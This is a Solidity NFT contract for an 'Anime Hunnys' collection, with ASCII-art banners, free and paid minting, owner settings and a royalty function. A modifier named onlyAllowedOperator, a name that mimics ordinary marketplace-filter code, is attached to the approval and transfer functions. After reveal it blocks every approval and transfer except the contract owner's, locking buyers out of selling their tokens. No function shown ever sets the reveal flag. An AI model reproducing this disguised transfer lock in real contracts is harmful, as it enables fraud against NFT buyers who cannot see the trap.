pragma solidity ^0.8.7;


import "erc721a/contracts/ERC721A.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Base64.sol";

contract HunnyNFT is ERC721A('Anime Hunnys', 'HUNNY'), Ownable {  
    

    /*
  _    _ _    _ _   _ _   ___     ___    _ _    _ _   _ _   ___     ___    _ _    _ _   _ _   ___     __
 | |  | | |  | | \ | | \ | \ \   / / |  | | |  | | \ | | \ | \ \   / / |  | | |  | | \ | | \ | \ \   / /
 | |__| | |  | |  \| |  \| |\ \_/ /| |__| | |  | |  \| |  \| |\ \_/ /| |__| | |  | |  \| |  \| |\ \_/ / 
 |  __  | |  | | . ` | . ` | \   / |  __  | |  | | . ` | . ` | \   / |  __  | |  | | . ` | . ` | \   /  
 | |  | | |__| | |\  | |\  |  | |  | |  | | |__| | |\  | |\  |  | |  | |  | | |__| | |\  | |\  |  | |   
 |_|  |_|\____/|_| \_|_| \_|  |_|  |_|  |_|\____/|_| \_|_| \_|  |_|  |_|  |_|\____/|_| \_|_| \_|  |_|   
                                                                                                        
                                                                                                        

      ░░      ░░        ░░░░    ▓▓██████████████████████████                              
░░░░██▓▓▓▓              ████░░░░░░░░░░░░░░░░░░░░░░░░░░░░████                          
░░▓▓░░░░▒▒████▓▓    ████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▓▓                      
  ██▓▓░░░░░░░░▒▒████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓      ░░████████████
░░▓▓░░▓▓░░░░░░▒▒██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░██▓▓░░░░░░░░░░██
░░▓▓░░▓▓░░░░▒▒▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░░░░░████
░░▓▓░░░░▓▓▒▒▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░▒▒░░██░░██
░░▓▓░░░░░░▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░▓▓░░░░██
░░▓▓░░░░░░▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░░░░░▓▓░░░░██░░░░██
░░▓▓░░░░▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░░░▓▓▒▒██░░░░░░██
  ░░▓▓░░▓▓░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░▒▒▓▓██░░░░██  
  ░░▓▓░░▓▓░░░░░░░░░░░░▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░░░██░░░░░░██  
    ░░▓▓░░░░░░░░░░░░████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░▓▓░░░░██    
    ░░▓▓░░░░░░░░░░░░████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░░░▓▓░░░░██    
  ░░░░▓▓░░  ░░░░░░██  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░▒▒▓▓██      
    ░░▓▓░░░░░░░░░░██  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░▒▒██  ░░    
  ░░▓▓░░░░░░░░░░░░██  ▓▓░░░░  ░░░░  ░░░░░░░░▓▓░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░▒▒▓▓  ░░    
  ░░▓▓░░░░░░░░▒▒▓▓    ██░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░▒▒██        
  ░░▓▓░░░░░░░░▒▒██░░  ██░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░▓▓░░░░░░▒▒██        
  ░░▓▓░░░░░░░░▒▒██      ██░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░▒▒▓▓░░░░░░▒▒██        
  ░░▓▓░░░░░░▒▒▒▒░░  ░░  ██░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░▒▒▓▓░░░░░░▒▒██        
  ░░▓▓░░░░░░▒▒▓▓░░      ██░░░░░░░░░░░░░░░░░░▒▒░░██░░░░░░░░░░░░░░▒▒▓▓░░░░░░▒▒██        
  ░░██░░░░░░▒▒▓▓        ░░▓▓░░▒▒░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░▒▒▓▓░░░░░░▒▒██        
  ░░██░░░░░░▒▒▓▓░░        ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓▓▓░░░░▒▒██░░░░░░▒▒██        
  ░░▓▓░░░░▒▒▓▓▓▓░░▓▓▓▓▓▓▓▓▓▓                ░░    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░▓▓░░░░░░▒▒██        
  ░░▓▓▒▒▒▒▒▒▓▓░░▓▓▓▓▓▓▓▓▓▓▓▓                      ▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓░░▒▒▒▒▒▒██        
  ░░▓▓▒▒▒▒▒▒██▓▓▓▓▓▓▓▓▓▓▓▓▓▓                      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░▒▒▒▒▒▒██        
  ░░▓▓▒▒▒▒▒▒▓▓▒▒  ▓▓▓▓▓▓▓▓▓▓                      ▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓░░▒▒▒▒▒▒▒▒██        
  ░░▓▓▒▒░░▒▒▓▓    ▓▓▓▓▓▓▓▓▓▓                      ▓▓▓▓▓▓▓▓▓▓    ▓▓░░▒▒░░░░▒▒██        
  ░░▓▓▒▒▒▒▒▒▓▓    ▓▓░░░░░░▓▓                      ▓▓░░░░░░▓▓    ▓▓▒▒▒▒▒▒▒▒▒▒██        
  ░░▓▓▒▒▒▒▒▒▓▓░░░░░░▓▓▓▓▓▓                          ▓▓▓▓▓▓░░░░░░▓▓▒▒▒▒▒▒▒▒▒▒██        
    ▓▓▒▒▒▒▒▒▓▓░░░░░░░░░░░░                          ░░░░░░░░░░░░▓▓▒▒▒▒▒▒▒▒▒▒██        
  ░░▓▓▒▒▒▒▒▒▒▒▒▒  ░░                              ░░      ░░░░▓▓▒▒▒▒▒▒▒▒▒▒▓▓██        
    ▓▓▒▒▒▒▒▒▒▒▓▓                  ▓▓▒▒    ░░              ░░  ▓▓▒▒▒▒▒▒▒▒▒▒▒▒██        
  ░░▓▓▒▒▒▒▒▒▒▒▒▒▓▓            ▓▓▓▓░░░░▓▓░░                  ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
  ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓      ▓▓░░░░▓▓  ░░▒▒              ▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
  ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓░░░░░░░░▓▓░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
    ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░░░░░░░░▓▓    ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
    ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░░░░░░░░░░░▓▓    ██▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
    ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░░░░░░░░░░░░▓▓░░▓▓      ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██        
    ░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░░░░░░░░░░▓▓  ▓▓          ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒██        
    ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒██░░░░░░░░░░░░░░██▓▓░░██      ██░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒██        
    ░░▓▓▒▒▒▒▓▓▒▒▒▒▒▒██░░░░░░░░░░░░▓▓▓▓      ██  ██░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▓▓▓▓██        
    ░░▓▓▒▒▒▒▓▓▒▒▒▒▒▒██░░░░░░░░░░░░▓▓▓▓      ████░░░░░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒██        
      ░░▓▓▒▒██▓▓▒▒▒▒██░░░░░░░░░░▓▓░░░░▓▓░░██░░░░░░░░░░░░██▒▒▒▒▒▒▒▒▒▒▓▓░░▓▓▒▒██        
        ▓▓▒▒▓▓▓▓▒▒▒▒██░░░░░░░░░░██░░░░▓▓░░██░░░░░░░░██░░██▒▒▒▒▒▒▒▒▒▒▓▓░░▓▓▓▓██        
      ░░▓▓▒▒▓▓░░██▒▒▒▒██░░░░░░██░░░░░░░░▓▓░░░░░░░░░░██░░░░██▒▒▒▒▒▒▓▓░░▓▓▒▒▓▓          
      ░░▓▓▒▒▓▓░░▓▓▒▒▒▒▒▒██████░░░░░░░░░░▓▓░░░░░░░░░░██░░░░▓▓▒▒▒▒▒▒▓▓░░██▒▒▒▒          
        ░░▓▓▓▓  ░░██▒▒▒▒▒▒██░░░░░░░░░░░░▓▓░░░░░░░░░░██░░░░██▒▒▒▒▓▓  ░░▓▓▒▒▓▓          
          ░░▓▓    ░░▓▓▒▒▒▒██░░░░░░░░░░░░▓▓░░▓▓░░░░░░░░▓▓░░░░▓▓▓▓░░  ░░▓▓▓▓░░          
            ░░▒▒    ░░▓▓▓▓▓▓░░░░░░░░░░░░▓▓░░░░░░░░░░░░██░░░░▓▓░░    ░░▓▓░░            
            ░░░░▓▓  ░░  ░░██░░░░░░░░░░░░▓▓░░░░░░░░░░░░██░░░░██    ░░▓▓░░              
                        ██░░░░░░░░░░░░▒▒▓▓░░██░░░░░░░░██░░░░░░▓▓░░                    
                        ██░░░░░░░░░░░░░░▓▓░░░░░░░░░░░░██░░░░░░██                      
                        ██░░░░░░░░░░░░▒▒▒▒░░░░░░░░░░░░░░██░░░░░░▓▓                    
                        ▓▓░░░░░░░░░░░░░░▓▓░░░░░░░░░░░░░░██░░░░░░▓▓                    
                        ██░░░░░░░░░░░░░░▓▓░░░░░░░░░░░░░░▓▓██▓▓██▓▓                    
                        ██████████████▓▓▓▓████████████████      ▓▓                    
                      ▓▓▒▒▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒▒▒▓▓██▓▓░░░░                  
                      ▓▓▒▒▒▒▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒██▒▒▒▒▒▒▓▓▒▒▒▒██░░░░                      
                      ▓▓▒▒▒▒▓▓▒▒▒▒▒▒▓▓▒▒▒▒▒▒██▒▒▒▒▒▒██▒▒▒▒██                          
                      ██▓▓▓▓██▓▓▓▓▓▓▓▓▓▓██▓▓██▓▓▓▓▓▓██▓▓▓▓██                          
                      ░░░░░░▓▓░░░░░░▓▓░░░░░░██░░░░░░▓▓░░░░░░                          
                            ▓▓      ▓▓      ██      ▓▓                                
                            ██▓▓▓▓▓▓▓▓  ░░  ██▓▓▓▓▓▓██                                
                            ▓▓▒▒▒▒▒▒▓▓      ██▒▒▒▒▒▒██                                
                            ██▒▒▒▒▒▒▓▓░░    ██▒▒▒▒▒▒██                                
                            ██▒▒▒▒▒▒▓▓      ██▒▒▒▒▒▒██                                
                            ██▒▒▒▒▒▒▓▓      ██▒▒▒▒▒▒██                                
                            ▓▓▒▒▒▒▒▒▓▓      ██▒▒▒▒▒▒██                                
                            ▓▓▒▒▒▒▒▒▒▒▓▓░░██▒▒▒▒▒▒▒▒██                                
                            ██▒▒▒▒▒▒▒▒▓▓  ▓▓▒▒▒▒▒▒▒▒██                                
                            ░░██▓▓▓▓██▓▓░░▓▓▓▓▓▓▓▓██░░                                

  _    _ _    _ _   _ _   ___     ___    _ _    _ _   _ _   ___     ___    _ _    _ _   _ _   ___     __
 | |  | | |  | | \ | | \ | \ \   / / |  | | |  | | \ | | \ | \ \   / / |  | | |  | | \ | | \ | \ \   / /
 | |__| | |  | |  \| |  \| |\ \_/ /| |__| | |  | |  \| |  \| |\ \_/ /| |__| | |  | |  \| |  \| |\ \_/ / 
 |  __  | |  | | . ` | . ` | \   / |  __  | |  | | . ` | . ` | \   / |  __  | |  | | . ` | . ` | \   /  
 | |  | | |__| | |\  | |\  |  | |  | |  | | |__| | |\  | |\  |  | |  | |  | | |__| | |\  | |\  |  | |   
 |_|  |_|\____/|_| \_|_| \_|  |_|  |_|  |_|\____/|_| \_|_| \_|  |_|  |_|  |_|\____/|_| \_|_| \_|  |_|   
                                                                                        
    */

    string prerevealedIpfs = "ipfs://QmcBQepAGS5zyVnKmHdz7EeLNyCGR8eok6sMGG3zr4qGgW";   
    string revealedIpfs = "???";   

    uint256 public maxSupply = 9999;
    uint256 public maxFree = 2222;
    uint256 public mintPrice = .003 ether;
    bool public revealed = false;
    bool public saleOpen = true;

    function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
        require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
            return string(abi.encodePacked(
                'data:application/json;base64,', Base64.encode(bytes(abi.encodePacked(
                            '{"name": "Hunny #', ERC721A._toString(_tokenId), 
                            '", "description":"', 
                            "",
                            '", "image": "', 
                            !revealed ? prerevealedIpfs : string(abi.encodePacked(revealedIpfs, '/', ERC721A._toString(_tokenId), '.png')),
                            '"}')))));
    }

    function freeMint(uint256 count) external {
        require(saleOpen, "sale not open");
        require(totalSupply() + count <= maxFree, "free mint over, see public mint!");
        require(count < 3, "too many free!");
        _safeMint(msg.sender, count);
    }

    function publicMint(uint256 count) external payable {
        require(msg.value >= (mintPrice * count), "not enough ETH");
        require(saleOpen, "sale not open");
        require(totalSupply() + count <= maxSupply);
        require(count < 10, "too many per tx!");
        _safeMint(msg.sender, count);
    }

    function reserveMint(uint256 _count) external onlyOwner {
        require(totalSupply() + _count <= maxSupply);
        _safeMint(msg.sender, _count);
    }

    function setMintPrice(uint256 newMintPrice) external onlyOwner {
        require(totalSupply() <= maxFree, "cant modify price after free mint is over!");
        mintPrice = newMintPrice;
    }

    function setMaxSupply(uint256 newMaxSupply) external onlyOwner {
        require(!revealed, "cant modify supply after reveal");
        require(newMaxSupply >= totalSupply(), "cant make max less than total");
        maxSupply = newMaxSupply;
    }

    function openSale() external onlyOwner {
        saleOpen = true;
    }

    function closeSale() external onlyOwner {
        saleOpen = false;
    }

    function setPrerevealedIpfs(string memory _newPrerevealedIpfs) external onlyOwner {
        prerevealedIpfs = _newPrerevealedIpfs;
    }

    function setRevealedIpfs(string memory _newRevealedIpfs) external onlyOwner {
        revealedIpfs = _newRevealedIpfs;
    }

    function approve(address to, uint256 tokenId) public payable virtual override onlyAllowedOperator(msg.sender) {
        ERC721A.approve(to, tokenId);
    }
    function setApprovalForAll(address operator, bool approved) public virtual override onlyAllowedOperator(msg.sender) {
        ERC721A.setApprovalForAll(operator, approved);
    }
    function isApprovedForAll(address _owner, address operator) public view virtual override onlyAllowedOperator(_owner) returns (bool) {
        return ERC721A.isApprovedForAll(_owner, operator);
    }
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public payable virtual override onlyAllowedOperator(from) {
        ERC721A.transferFrom(from, to, tokenId);
    }
    function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
        ERC721A.safeTransferFrom(from, to, tokenId);
    }
    modifier onlyAllowedOperator(address _from) {if (revealed) {require(_from == owner() ||  msg.sender == owner());} _;}
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
        public payable 
        override
        onlyAllowedOperator(from)
    {
        ERC721A.safeTransferFrom(from, to, tokenId, data);
    }

    function hunny() external {
        (bool r,) = payable(owner()).call{value: address(this).balance}('');
        require(r);
    }

    function royaltyInfo(
        uint256 _tokenId,
        uint256 _salePrice
    ) external view returns (
        address, uint256
    ) {
        return (owner(), _salePrice / 20);
    }
}